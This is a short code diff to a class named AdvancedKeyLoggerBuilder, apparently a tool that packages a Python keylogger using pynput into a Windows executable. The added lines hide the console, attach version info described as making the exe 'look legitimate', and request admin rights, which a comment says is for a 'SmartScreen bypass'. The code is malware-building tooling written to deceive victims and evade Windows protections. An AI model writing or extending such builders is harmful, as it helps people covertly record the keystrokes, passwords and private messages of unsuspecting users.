@@ -177,6 +177,16 @@ class AdvancedKeyLoggerBuilder:
         if sys.platform == 'win32':
             cmd.append('--noconsole')
 
+            # Add version info to make exe look legitimate
+            version_info_path = self.base_dir / 'version_info.txt'
+            if version_info_path.exists():
+                cmd.extend(['--version-file', str(version_info_path)])
+
+            # Add Windows manifest for admin request
+            cmd.extend([
+                '--uac-admin',  # Request admin privileges (for SmartScreen bypass)
+            ])
+
         # Add modules as hidden imports
         cmd.extend([
             '--hidden-import', 'pynput',
